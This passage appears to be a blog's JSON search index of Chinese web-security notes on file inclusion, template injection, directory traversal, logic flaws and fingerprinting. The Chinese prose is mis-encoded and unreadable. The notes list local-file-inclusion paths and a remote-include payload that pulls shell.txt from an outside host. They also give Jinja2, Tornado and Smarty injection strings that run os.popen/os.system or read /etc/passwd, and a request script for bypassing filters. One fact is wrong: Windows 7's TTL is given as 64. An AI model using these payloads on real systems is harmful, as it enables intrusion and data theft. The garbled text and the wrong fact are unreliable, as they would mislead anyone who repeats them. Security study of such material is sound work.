çš„å‹ç¼©åŒ…æ–‡ä»¶ä¼šè¢«è§£å‹çš„æ–‡ä»¶æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä¸Šä¼ å«ç¬¦å·é“¾æ¥çš„æ–‡ä»¶ è‹¥æœåŠ¡å™¨æ²¡æœ‰åšå¥½é˜²æŠ¤ï¼Œå¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–çš„æ•ˆæœ é˜²æŠ¤æŠ€å·§ ä½¿ç”¨ç™½åå•é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ ä½¿ç”¨æ›´ä¸¥æ ¼çš„æ–‡ä»¶ç±»å‹æ£€æŸ¥æ–¹å¼ é™åˆ¶Web Serverå¯¹ä¸Šä¼ æ–‡ä»¶å¤¹çš„è§£æ","categories":[],"tags":[]},{"title":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:46:41.839Z","comments":true,"path":"2023/12/26/æ–‡ä»¶åŒ…å«/","link":"","permalink":"http://example.com/2023/12/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"æ–‡ä»¶åŒ…å«[TOC]","text":"æ–‡ä»¶åŒ…å«[TOC] åŸºç¡€å¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´çš„å½¢å¼ä¸º &lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt; è€ƒè™‘å¸¸ç”¨çš„å‡ ç§åŒ…å«æ–¹å¼ä¸º åŒç›®å½•åŒ…å« file=.htaccess ç›®å½•éå† ?file=../../../../../../../../../var/lib/locate.db æ—¥å¿—æ³¨å…¥ ?file=../../../../../../../../../var/log/apache/error.log åˆ©ç”¨ /proc/self/environ å…¶ä¸­æ—¥å¿—å¯ä»¥ä½¿ç”¨SSHæ—¥å¿—æˆ–è€…Webæ—¥å¿—ç­‰å¤šç§æ—¥å¿—æ¥æºæµ‹è¯• è§¦å‘SinkPHP include åœ¨åŒ…å«è¿‡ç¨‹ä¸­å‡ºé”™ä¼šæŠ¥é”™ï¼Œä¸å½±å“æ‰§è¡Œåç»­è¯­å¥ include_once ä»…åŒ…å«ä¸€æ¬¡ require åœ¨åŒ…å«è¿‡ç¨‹ä¸­å‡ºé”™ï¼Œå°±ä¼šç›´æ¥é€€å‡ºï¼Œä¸æ‰§è¡Œåç»­è¯­å¥ require_once ç»•è¿‡æŠ€å·§å¸¸è§çš„åº”ç”¨åœ¨æ–‡ä»¶åŒ…å«ä¹‹å‰ï¼Œå¯èƒ½ä¼šè°ƒç”¨å‡½æ•°å¯¹å…¶è¿›è¡Œåˆ¤æ–­ï¼Œä¸€èˆ¬æœ‰å¦‚ä¸‹å‡ ç§ç»•è¿‡æ–¹å¼ urlç¼–ç ç»•è¿‡å¦‚æœWAFä¸­æ˜¯å­—ç¬¦ä¸²åŒ¹é…ï¼Œå¯ä»¥ä½¿ç”¨urlå¤šæ¬¡ç¼–ç çš„æ–¹å¼å¯ä»¥ç»•è¿‡ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ æŸäº›æƒ…å†µä¸‹ï¼Œè¯»æ–‡ä»¶æ”¯æŒä½¿ç”¨Shellé€šé…ç¬¦ï¼Œå¦‚ ? * ç­‰ urlä¸­ ä½¿ç”¨ ? # å¯èƒ½ä¼šå½±å“includeåŒ…å«çš„ç»“æœ æŸäº›æƒ…å†µä¸‹ï¼Œunicodeç¼–ç ä¸åŒä½†æ˜¯å­—å½¢ç›¸è¿‘çš„å­—ç¬¦æœ‰åŒä¸€ä¸ªæ•ˆæœ %00æˆªæ–­å‡ ä¹æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œæ¡ä»¶æ˜¯ magic_quotes_gpc å…³é—­ï¼Œè€Œä¸”phpç‰ˆæœ¬å°äº5.3.4ã€‚ é•¿åº¦æˆªæ–­Windowsä¸Šçš„æ–‡ä»¶åé•¿åº¦å’Œæ–‡ä»¶è·¯å¾„æœ‰å…³ã€‚å…·ä½“å…³ç³»ä¸ºï¼šä»æ ¹ç›®å½•è®¡ç®—ï¼Œæ–‡ä»¶è·¯å¾„é•¿åº¦æœ€é•¿ä¸º259ä¸ªbytesã€‚ msdnå®šä¹‰ #define MAX_PATH 260ï¼Œå…¶ä¸­ç¬¬260ä¸ªå­—ç¬¦ä¸ºå­—ç¬¦ä¸²ç»“å°¾çš„ \\0 ï¼Œè€Œlinuxå¯ä»¥ç”¨getconfæ¥åˆ¤æ–­æ–‡ä»¶åé•¿åº¦é™åˆ¶å’Œæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶ã€‚ è·å–æœ€é•¿æ–‡ä»¶è·¯å¾„é•¿åº¦ï¼šgetconf PATH_MAX &#x2F;root å¾—åˆ°4096 è·å–æœ€é•¿æ–‡ä»¶åï¼šgetconf NAME_MAX &#x2F;root å¾—åˆ°255 é‚£ä¹ˆåœ¨é•¿åº¦æœ‰é™çš„æ—¶å€™ï¼Œ././././ (nä¸ª) çš„å½¢å¼å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæŠŠè·¯å¾„çˆ†æ‰ åœ¨phpä»£ç åŒ…å«ä¸­ï¼Œè¿™ç§ç»•è¿‡æ–¹å¼è¦æ±‚phpç‰ˆæœ¬ &lt; php 5.2.8 ä¼ªåè®®ç»•è¿‡ è¿œç¨‹åŒ…å«: è¦æ±‚ allow_url_fopen=On ä¸” allow_url_include=On ï¼Œ payloadä¸º ?file=[http|https|ftp]://websec.wordpress.com/shell.txt çš„å½¢å¼ PHP input: æŠŠpayloadæ”¾åœ¨POSTå‚æ•°ä¸­ä½œä¸ºåŒ…å«çš„æ–‡ä»¶ï¼Œè¦æ±‚ allow_url_include=On ï¼Œpayloadä¸º ?file=php://input çš„å½¢å¼ Base64: ä½¿ç”¨Base64ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œpayloadä¸º ?file=php://filter/convert.base64-encode/resource=index.php çš„å½¢å¼ data: ä½¿ç”¨dataä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œpayloadä¸º ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= çš„å½¢å¼ï¼Œè¦æ±‚ allow_url_include=On åè®®ç»•è¿‡allow_url_fopen å’Œ allow_url_include ä¸»è¦æ˜¯é’ˆå¯¹ http ftp ä¸¤ç§åè®®èµ·ä½œç”¨ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨SMBã€WebDavåè®®ç­‰æ–¹å¼æ¥ç»•è¿‡é™åˆ¶ã€‚","categories":[],"tags":[]},{"title":"æ¨¡æ¿æ³¨å…¥","slug":"æ¨¡æ¿æ³¨å…¥","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:45:37.902Z","comments":true,"path":"2023/12/26/æ¨¡æ¿æ³¨å…¥/","link":"","permalink":"http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"æ¨¡ç‰ˆæ³¨å…¥ç®€ä»‹æ¨¡æ¿å¼•æ“ç”¨äºä½¿ç”¨åŠ¨æ€æ•°æ®å‘ˆç°å†…å®¹ã€‚æ­¤ä¸Šä¸‹æ–‡æ•°æ®é€šå¸¸ç”±ç”¨æˆ·æ§åˆ¶å¹¶ç”±æ¨¡æ¿è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥ç”Ÿæˆç½‘é¡µã€ç”µå­é‚®ä»¶ç­‰ã€‚æ¨¡æ¿å¼•æ“é€šè¿‡ä½¿ç”¨ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶è¯­å¥ã€å¾ªç¯ç­‰ï¼‰å¤„ç†ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨å¼ºå¤§çš„è¯­è¨€è¡¨è¾¾å¼ï¼Œä»¥å‘ˆç°åŠ¨æ€å†…å®¹ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¦å‘ˆç°çš„æ¨¡æ¿ï¼Œåˆ™ä»–ä»¬å°†èƒ½å¤Ÿæ³¨å…¥å¯æš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼ã€‚","text":"æ¨¡ç‰ˆæ³¨å…¥ç®€ä»‹æ¨¡æ¿å¼•æ“ç”¨äºä½¿ç”¨åŠ¨æ€æ•°æ®å‘ˆç°å†…å®¹ã€‚æ­¤ä¸Šä¸‹æ–‡æ•°æ®é€šå¸¸ç”±ç”¨æˆ·æ§åˆ¶å¹¶ç”±æ¨¡æ¿è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥ç”Ÿæˆç½‘é¡µã€ç”µå­é‚®ä»¶ç­‰ã€‚æ¨¡æ¿å¼•æ“é€šè¿‡ä½¿ç”¨ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶è¯­å¥ã€å¾ªç¯ç­‰ï¼‰å¤„ç†ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨å¼ºå¤§çš„è¯­è¨€è¡¨è¾¾å¼ï¼Œä»¥å‘ˆç°åŠ¨æ€å†…å®¹ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¦å‘ˆç°çš„æ¨¡æ¿ï¼Œåˆ™ä»–ä»¬å°†èƒ½å¤Ÿæ³¨å…¥å¯æš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼ã€‚ æµ‹è¯•æ–¹æ³• ç¡®å®šä½¿ç”¨çš„å¼•æ“ æŸ¥çœ‹å¼•æ“ç›¸å…³çš„æ–‡æ¡£ï¼Œç¡®å®šå…¶å®‰å…¨æœºåˆ¶ä»¥åŠè‡ªå¸¦çš„å‡½æ•°å’Œå˜é‡ éœ€æ‰¾æ”»å‡»é¢ï¼Œå°è¯•æ”»å‡» æµ‹è¯•ç”¨ä¾‹ ç®€å•çš„æ•°å­¦è¡¨è¾¾å¼ï¼Œ&#123;&#123; 7+7 &#125;&#125; =&gt; 14 å­—ç¬¦ä¸²è¡¨è¾¾å¼ &#123;&#123; \"ajin\" &#125;&#125; =&gt; ajin Ruby &lt;%= 7 * 7 %&gt;``&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt; Java $&#123;7*7&#125; Twig &#123;&#123;7*7&#125;&#125; Smarty &#123;php&#125;echo id;&#123;/php&#125; AngularJS $eval(&#39;1+1&#39;) Tornado å¼•ç”¨æ¨¡å— &#123;% import module %&#125;&#x3D;&gt; &#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125; Flask&#x2F;Jinja2 &#123;&#123; config &#125;&#125;``&#123;&#123; config.items() &#125;&#125;``&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;``&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;``&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;``&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125; Django &#123;&#123; request &#125;&#125;``&#123;% debug %&#125;``&#123;% load module %&#125;``&#123;% include \"x.html\" %&#125;``&#123;% extends \"x.html\" %&#125; ç›®æ ‡ åˆ›å»ºå¯¹è±¡ æ–‡ä»¶è¯»å†™ è¿œç¨‹æ–‡ä»¶åŒ…å« ä¿¡æ¯æ³„æ¼ ææƒ ç›¸å…³å±æ€§__class__pythonä¸­çš„æ–°å¼ç±»ï¼ˆå³æ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±æ€§ __class__ ç”¨äºè·å–å½“å‰å®ä¾‹å¯¹åº”çš„ç±»ï¼Œä¾‹å¦‚ &quot;&quot;.__class__ å°±å¯ä»¥è·å–åˆ°å­—ç¬¦ä¸²å®ä¾‹å¯¹åº”çš„ç±» __mro__pythonä¸­ç±»å¯¹è±¡çš„ __mro__ å±æ€§ä¼šè¿”å›ä¸€ä¸ªtupleå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†å½“å‰ç±»å¯¹è±¡æ‰€æœ‰ç»§æ‰¿çš„åŸºç±»ï¼Œtupleä¸­å…ƒç´ çš„é¡ºåºæ˜¯MROï¼ˆMethod Resolution Orderï¼‰ å¯»æ‰¾çš„é¡ºåºã€‚ __globals__ä¿å­˜äº†å‡½æ•°æ‰€æœ‰çš„æ‰€æœ‰å…¨å±€å˜é‡ï¼Œåœ¨åˆ©ç”¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ __init__ è·å–å¯¹è±¡çš„å‡½æ•°ï¼Œå¹¶é€šè¿‡ __globals__ è·å– file os ç­‰æ¨¡å—ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„åˆ©ç”¨ __subclasses__()pythonçš„æ–°å¼ç±»éƒ½ä¿ç•™äº†å®ƒæ‰€æœ‰çš„å­ç±»çš„å¼•ç”¨ï¼Œ__subclasses__() è¿™ä¸ªæ–¹æ³•è¿”å›äº†ç±»çš„æ‰€æœ‰å­˜æ´»çš„å­ç±»çš„å¼•ç”¨ï¼ˆæ˜¯ç±»å¯¹è±¡å¼•ç”¨ï¼Œä¸æ˜¯å®ä¾‹ï¼‰ã€‚ å› ä¸ºpythonä¸­çš„ç±»éƒ½æ˜¯ç»§æ‰¿objectçš„ï¼Œæ‰€ä»¥åªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„ __subclasses__() æ–¹æ³•å°±å¯ä»¥è·å–æƒ³è¦çš„ç±»çš„å¯¹è±¡ã€‚ ç»•è¿‡æŠ€å·§å­—ç¬¦ä¸²æ‹¼æ¥1request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60] ä½¿ç”¨å‚æ•°ç»•è¿‡12345678910params = &#123; &#x27;clas&#x27;: &#x27;__class__&#x27;, &#x27;mr&#x27;: &#x27;__mro__&#x27;, &#x27;subc&#x27;: &#x27;__subclasses__&#x27;&#125;data = &#123; &quot;data&quot;: &quot;&#123;&#123;&#x27;&#x27;[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;&#125;r = requests.post(url, params=params, data=data)print(r.text)","categories":[],"tags":[]},{"title":"ç›®å½•ç©¿è¶Š","slug":"ç›®å½•ç©¿è¶Š","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:45:45.823Z","comments":true,"path":"2023/12/26/ç›®å½•ç©¿è¶Š/","link":"","permalink":"http://example.com/2023/12/26/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/","excerpt":"ç›®å½•ç©¿è¶Š [TOC]","text":"ç›®å½•ç©¿è¶Š [TOC] ç›®å½•ç©¿è¶Šç®€ä»‹ç›®å½•ç©¿è¶Šï¼ˆä¹Ÿè¢«ç§°ä¸ºç›®å½•éå†&#x2F;directory traversal&#x2F;path traversalï¼‰æ˜¯é€šè¿‡ä½¿ç”¨ ../ ç­‰ç›®å½•æ§åˆ¶åºåˆ—æˆ–è€…æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ¥è®¿é—®å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶å’Œç›®å½•ï¼Œç‰¹åˆ«æ˜¯åº”ç”¨ç¨‹åºæºä»£ç ã€é…ç½®æ–‡ä»¶ã€é‡è¦çš„ç³»ç»Ÿæ–‡ä»¶ç­‰ã€‚ æ”»å‡»è½½è·URLå‚æ•° ../ ..\\ ..;/ Nginx Off by Slash https://vuln.site.com/files../ UNC Bypass \\\\localhost\\c$\\windows\\win.ini è¿‡æ»¤ç»•è¿‡ å•æ¬¡æ›¿æ¢ ...// URLç¼–ç  16ä½Unicodeç¼–ç  \\u002e è¶…é•¿UTF-8ç¼–ç  \\%e0%40%ae é˜²å¾¡åœ¨è¿›è¡Œæ–‡ä»¶æ“ä½œç›¸å…³çš„APIå‰ï¼Œåº”è¯¥å¯¹ç”¨æˆ·è¾“å…¥åšè¿‡æ»¤ã€‚è¾ƒå¼ºçš„è§„åˆ™ä¸‹å¯ä»¥ä½¿ç”¨ç™½åå•ï¼Œä»…å…è®¸çº¯å­—æ¯æˆ–æ•°å­—å­—ç¬¦ç­‰ã€‚ è‹¥è§„åˆ™å…è®¸çš„å­—ç¬¦è¾ƒå¤šï¼Œæœ€å¥½ä½¿ç”¨å½“å‰æ“ä½œç³»ç»Ÿè·¯å¾„è§„èŒƒåŒ–å‡½æ•°è§„èŒƒåŒ–è·¯å¾„åï¼Œè¿›è¡Œè¿‡æ»¤ï¼Œæœ€åå†è¿›è¡Œç›¸å…³è°ƒç”¨ã€‚","categories":[],"tags":[]},{"title":"é€»è¾‘æ¼æ´/ä¸šåŠ¡æ¼æ´","slug":"é€»è¾‘æ¼æ´","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:45:26.587Z","comments":true,"path":"2023/12/26/é€»è¾‘æ¼æ´/","link":"","permalink":"http://example.com/2023/12/26/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"é€»è¾‘æ¼æ´ &#x2F; ä¸šåŠ¡æ¼æ´ç®€ä»‹é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥å¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯å¤„ç†é”™è¯¯é€ æˆçš„æ¼æ´ã€‚ åœ¨å®é™…å¼€å‘ä¸­ï¼Œå› ä¸ºå¼€å‘è€…æ°´å¹³ä¸ä¸€æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œè€Œä¸”ä¸šåŠ¡å‘å±•è¿…é€Ÿå†…éƒ¨æµ‹è¯•æ²¡æœ‰åŠæ—¶åˆ°ä½ï¼Œæ‰€ä»¥å¸¸å¸¸ä¼šå‡ºç°ç±»ä¼¼çš„æ¼æ´ã€‚","text":"é€»è¾‘æ¼æ´ &#x2F; ä¸šåŠ¡æ¼æ´ç®€ä»‹é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥å¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯å¤„ç†é”™è¯¯é€ æˆçš„æ¼æ´ã€‚ åœ¨å®é™…å¼€å‘ä¸­ï¼Œå› ä¸ºå¼€å‘è€…æ°´å¹³ä¸ä¸€æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œè€Œä¸”ä¸šåŠ¡å‘å±•è¿…é€Ÿå†…éƒ¨æµ‹è¯•æ²¡æœ‰åŠæ—¶åˆ°ä½ï¼Œæ‰€ä»¥å¸¸å¸¸ä¼šå‡ºç°ç±»ä¼¼çš„æ¼æ´ã€‚ å®‰è£…é€»è¾‘ æŸ¥çœ‹èƒ½å¦ç»•è¿‡åˆ¤å®šé‡æ–°å®‰è£… æŸ¥çœ‹èƒ½å¦åˆ©ç”¨å®‰è£…æ–‡ä»¶è·å–ä¿¡æ¯ çœ‹èƒ½å¦åˆ©ç”¨æ›´æ–°åŠŸèƒ½è·å–ä¿¡æ¯ äº¤æ˜“è´­ä¹° ä¿®æ”¹æ”¯ä»˜çš„ä»·æ ¼ ä¿®æ”¹æ”¯ä»˜çš„çŠ¶æ€ ä¿®æ”¹è´­ä¹°æ•°é‡ä¸ºè´Ÿæ•° ä¿®æ”¹é‡‘é¢ä¸ºè´Ÿæ•° é‡æ”¾æˆåŠŸçš„è¯·æ±‚ å¹¶å‘æ•°æ®åº“é”å¤„ç†ä¸å½“ ä¸šåŠ¡é£æ§ åˆ·ä¼˜æƒ åˆ¸ å¥—ç° è´¦æˆ·æ³¨å†Œ è¦†ç›–æ³¨å†Œ å°è¯•é‡å¤ç”¨æˆ·å æ³¨å†Œéå†çŒœè§£å·²æœ‰è´¦å· å¯†ç  å¯†ç æœªä½¿ç”¨å“ˆå¸Œç®—æ³•ä¿å­˜ æ²¡æœ‰éªŒè¯ç”¨æˆ·è®¾ç½®å¯†ç çš„å¼ºåº¦ é‚®ç®±ç”¨æˆ·å å‰åç©ºæ ¼ å¤§å°å†™å˜æ¢ Cookie åŒ…å«æ•æ„Ÿä¿¡æ¯ æœªéªŒè¯åˆæ³•æ€§å¯ä¼ªé€  æ‰‹æœºå·ç”¨æˆ·å å‰åç©ºæ ¼ +86 ç™»å½• æ’åº“ è®¾ç½®å¼‚åœ°ç™»å½•æ£€æŸ¥ç­‰æœºåˆ¶ è´¦å·åŠ«æŒ æ¶æ„å°è¯•å¸å·å¯†ç é”æ­»è´¦æˆ· éœ€è¦è®¾ç½®é”å®šæœºåˆ¶ä¸è§£é”æœºåˆ¶ ä¸å®‰å…¨çš„ä¼ è¾“ä¿¡é“ ç™»å½•å‡­è¯å­˜å‚¨åœ¨ä¸å®‰å…¨çš„ä½ç½® æ‰¾å›å¯†ç  é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç  å¯†ç é‡ç½®åæ–°å¯†ç åœ¨è¿”å›åŒ…ä¸­ TokenéªŒè¯é€»è¾‘åœ¨å‰ç«¯ X-Forwarded-Hostå¤„ç†ä¸æ­£ç¡® æ‰¾å›å¯†ç åŠŸèƒ½æ³„éœ²ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ ä¿®æ”¹å¯†ç  è¶Šæƒä¿®æ”¹å¯†ç  ä¿®æ”¹å¯†ç æ²¡æœ‰æ—§å¯†ç éªŒè¯ ç”³è¯‰ èº«ä»½ä¼ªé€  é€»è¾‘ç»•è¿‡ æ›´æ–° ORMæ›´æ–°æ“ä½œä¸å½“å¯æ›´æ–°ä»»æ„å­—æ®µ æƒé™é™åˆ¶ä¸å½“å¯ä»¥è¶Šæƒä¿®æ”¹ ä¿¡æ¯æŸ¥è¯¢ æƒé™é™åˆ¶ä¸å½“å¯ä»¥è¶ŠæƒæŸ¥è¯¢ ç”¨æˆ·ä¿¡æ¯IDå¯ä»¥çŒœæµ‹å¯¼è‡´éå† 2FA é‡ç½®å¯†ç åè‡ªåŠ¨ç™»å½•æ²¡æœ‰2FA OAuthç™»å½•æ²¡æœ‰å¯ç”¨2FA 2FAå¯çˆ†ç ´ 2FAæœ‰æ¡ä»¶ç«äº‰ ä¿®æ”¹è¿”å›å€¼ç»•è¿‡ æ¿€æ´»é“¾æ¥æ²¡æœ‰å¯ç”¨2FA å¯é€šè¿‡CSRFç¦ç”¨2FA éªŒè¯ç  éªŒè¯ç å¯é‡ç”¨ éªŒè¯ç å¯é¢„æµ‹ éªŒè¯ç å¼ºåº¦ä¸å¤Ÿ éªŒè¯ç æ— æ—¶é—´é™åˆ¶æˆ–è€…å¤±æ•ˆæ—¶é—´é•¿ éªŒè¯ç æ— çŒœæµ‹æ¬¡æ•°é™åˆ¶ éªŒè¯ç ä¼ é€’ç‰¹æ®Šçš„å‚æ•°æˆ–ä¸ä¼ é€’å‚æ•°ç»•è¿‡ éªŒè¯ç å¯ä»è¿”å›åŒ…ä¸­ç›´æ¥è·å– éªŒè¯ç ä¸åˆ·æ–°æˆ–æ— æ•ˆ éªŒè¯ç æ•°é‡æœ‰é™ éªŒè¯ç åœ¨æ•°æ®åŒ…ä¸­è¿”å› ä¿®æ”¹Cookieç»•è¿‡ ä¿®æ”¹è¿”å›åŒ…ç»•è¿‡ éªŒè¯ç åœ¨å®¢æˆ·ç«¯ç”Ÿæˆæˆ–æ ¡éªŒ éªŒè¯ç å¯OCRæˆ–ä½¿ç”¨æœºå™¨å­¦ä¹ è¯†åˆ« éªŒè¯ç ç”¨äºæ‰‹æœºçŸ­ä¿¡&#x2F;é‚®ç®±è½°ç‚¸ Session Sessionæœºåˆ¶ SessionçŒœæµ‹ &#x2F; çˆ†ç ´ Sessionä¼ªé€  Sessionæ³„æ¼ Session Fixation è¶Šæƒ æœªæˆæƒè®¿é—® é™æ€æ–‡ä»¶é€šè¿‡ç‰¹å®šurlæ¥é˜²æ­¢è¢«è®¿é—® æ°´å¹³è¶Šæƒ æ”»å‡»è€…å¯ä»¥è®¿é—®ä¸ä»–æ‹¥æœ‰ç›¸åŒæƒé™çš„ç”¨æˆ·çš„èµ„æºæƒé™ç±»å‹ä¸å˜ï¼ŒIDæ”¹å˜ å‚ç›´è¶Šæƒ ä½çº§åˆ«æ”»å‡»è€…å¯ä»¥è®¿é—®é«˜çº§åˆ«ç”¨æˆ·çš„èµ„æºæƒé™IDä¸å˜ï¼Œç±»å‹æ”¹å˜ äº¤å‰è¶Šæƒ æƒé™IDæ”¹å˜ï¼Œç±»å‹æ”¹å˜ éšæœºæ•°å®‰å…¨ ä½¿ç”¨ä¸å®‰å…¨çš„éšæœºæ•°å‘ç”Ÿå™¨ ä½¿ç”¨æ—¶é—´ç­‰æ˜“çŒœè§£çš„å› ç´ ä½œä¸ºéšæœºæ•°ç§å­ å…¶ä»– ç”¨æˆ·&#x2F;è®¢å•&#x2F;ä¼˜æƒ åˆ¸ç­‰IDç”Ÿæˆæœ‰è§„å¾‹ï¼Œå¯æšä¸¾ æ¥å£æ— æƒé™ã€æ¬¡æ•°é™åˆ¶ åŠ å¯†ç®—æ³•å®ç°è¯¯ç”¨ æ‰§è¡Œé¡ºåº æ•æ„Ÿä¿¡æ¯æ³„éœ²","categories":[],"tags":[]},{"title":"é…ç½®ä¸å®‰å…¨","slug":"é…ç½®ä¸ç­–ç•¥å®‰å…¨","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:46:07.344Z","comments":true,"path":"2023/12/26/é…ç½®ä¸ç­–ç•¥å®‰å…¨/","link":"","permalink":"http://example.com/2023/12/26/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/","excerpt":"é…ç½®ä¸ç­–ç•¥å®‰å…¨","text":"é…ç½®ä¸ç­–ç•¥å®‰å…¨ è®¤è¯ç­–ç•¥å¯†ç ç­–ç•¥ æœªé™åˆ¶å¯†ç æœ€ä½ä½æ•° æœªé™åˆ¶å¯†ç å¿…é¡»åŒ…å«å­—ç¬¦é›† ä¸ºå¸¸ç”¨å¯†ç  ä¸ªäººä¿¡æ¯ç›¸å…³ æ‰‹æœºå·ç”Ÿæ—¥å§“åç”¨æˆ·å æœªæ£€æµ‹å¸¸è§å¼±å¯†ç  å·²æ³„éœ²çš„å¸¸ç”¨å¯†ç é”®ç›˜æ¨¡å¼ åŠ å¯†å®ç° åœ¨å®¢æˆ·ç«¯å­˜å‚¨ç§é’¥ æƒé™é…ç½® è¿ç»´äººå‘˜æƒé™ç²’åº¦è¿‡å¤§ å®¢æœäººå‘˜æƒé™ç²’åº¦è¿‡å¤§ ä¾›åº”é“¾å®‰å…¨ä¸‰æ–¹è®¤è¯ åˆ©ç”¨è¢«æ”»å‡»çš„ç¬¬ä¸‰æ–¹æœåŠ¡è´¦å·ç™»å½•å…¶ä»–å¹³å°è´¦å· ä¸‰æ–¹åº“&#x2F;è½¯ä»¶ å…¬å¼€æ¼æ´åæ²¡æœ‰åŠæ—¶æ›´æ–°","categories":[],"tags":[]},{"title":"åˆ¤æ–­æ•°æ®åº“","slug":"åˆ¤æ–­æ•°æ®åº“","date":"2023-12-25T18:01:02.000Z","updated":"2024-01-21T16:45:59.661Z","comments":true,"path":"2023/12/26/åˆ¤æ–­æ•°æ®åº“/","link":"","permalink":"http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"æ•°æ®åº“åˆ¤å®šâ€‹ ç«¯å£æ‰«æ 1234567mysql 3306oracle 1521sql server 1433db2 5000","text":"æ•°æ®åº“åˆ¤å®šâ€‹ ç«¯å£æ‰«æ 1234567mysql 3306oracle 1521sql server 1433db2 5000","categories":[],"tags":[]},{"title":"åˆ¤æ–­æ“ä½œç³»ç»Ÿ","slug":"åˆ¤æ–­æ“ä½œç³»ç»Ÿ","date":"2023-12-25T17:59:56.000Z","updated":"2024-01-21T16:45:53.467Z","comments":true,"path":"2023/12/26/åˆ¤æ–­æ“ä½œç³»ç»Ÿ/","link":"","permalink":"http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","excerpt":"åˆ¤æ–­æ“ä½œç³»ç»Ÿttl123456WINDOWS NT/2000 TTLï¼š128WINDOWS 95/98 TTLï¼š32UNIX TTLï¼š255LINUX TTLï¼š64WIN7 TTLï¼š64 nmapä½¿ç”¨æŠ€æœ¯å¯ä»¥å…·ä½“äº†è§£åˆ¤å®šæ–¹æ³•","text":"åˆ¤æ–­æ“ä½œç³»ç»Ÿttl123456WINDOWS NT/2000 TTLï¼š128WINDOWS 95/98 TTLï¼š32UNIX TTLï¼š255LINUX TTLï¼š64WIN7 TTLï¼š64 nmapä½¿ç”¨æŠ€æœ¯å¯ä»¥å…·ä½“äº†è§£åˆ¤å®šæ–¹æ³•","categories":[],"tags":[]},{"title":"åŠ è§£å¯†","slug":"åŠ è§£å¯†","date":"2023-12-25T17:57:41.000Z","updated":"2024-01-21T16:45:09.684Z","comments":true,"path":"2023/12/26/åŠ è§£å¯†/","link":"","permalink":"http://example.com/2023/12/26/%E5%8A%A0%E8%A7%A3%E5%AF%86/","excerpt":"åŠ è§£å¯†","text":"åŠ è§£å¯† 